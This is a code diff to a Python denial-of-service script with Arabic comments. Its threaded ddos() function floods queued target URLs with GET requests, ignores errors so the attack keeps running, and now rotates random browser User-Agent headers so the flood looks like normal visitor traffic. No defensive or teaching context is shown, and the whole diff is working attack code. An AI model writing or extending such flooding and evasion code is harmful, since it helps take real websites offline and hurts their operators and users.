@@ -1,18 +1,27 @@
 import requests
 import threading
+import random
 from queue import Queue
 
-# قائمة المهام (URLs)
+# قائمة رؤوس المستخدم (User-Agents)
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    # أضف المزيد من وكلاء المستخدم هنا
+]
+
 urls = Queue()
 
 def ddos():
     """
-    تنفيذ الطلبات على الهدف بصمت تام.
+    تنفيذ الطلبات على الهدف بصمت تام دون استخدام الوكلاء.
     """
     while not urls.empty():
         url = urls.get()
         try:
-            requests.get(url, timeout=5)  # إرسال الطلب
+            headers = {"User-Agent": random.choice(user_agents)}
+            requests.get(url, headers=headers, timeout=5)  # إرسال الطلب
         except requests.exceptions.RequestException:
             pass  # تجاهل الأخطاء لضمان الاستمرارية
         urls.task_done()
